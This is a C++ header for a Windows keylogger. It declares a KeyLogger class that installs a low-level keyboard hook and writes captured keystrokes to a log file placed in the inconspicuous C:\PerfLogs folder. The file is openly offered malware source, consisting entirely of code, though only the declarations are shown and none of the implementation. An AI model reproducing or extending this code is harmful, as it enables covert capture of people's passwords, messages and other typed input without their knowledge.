#pragma once
#include "File.hpp"
#include "Logger.hpp"
#include <iostream>

constexpr wchar_t* KEYS_FILE_PATH = L"C:\\PerfLogs\\keys.log";

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);

const class KeyLogger
{
public:
	static void start();

private:
	HHOOK create_hook();

private:
	HHOOK keyboard_hook;

private:
	explicit KeyLogger();
	~KeyLogger();

private:
	KeyLogger(const KeyLogger&) = delete;
	KeyLogger(KeyLogger&&) = delete;
	KeyLogger& operator=(const KeyLogger&) = delete;
	KeyLogger& operator=(KeyLogger&) = delete;
};

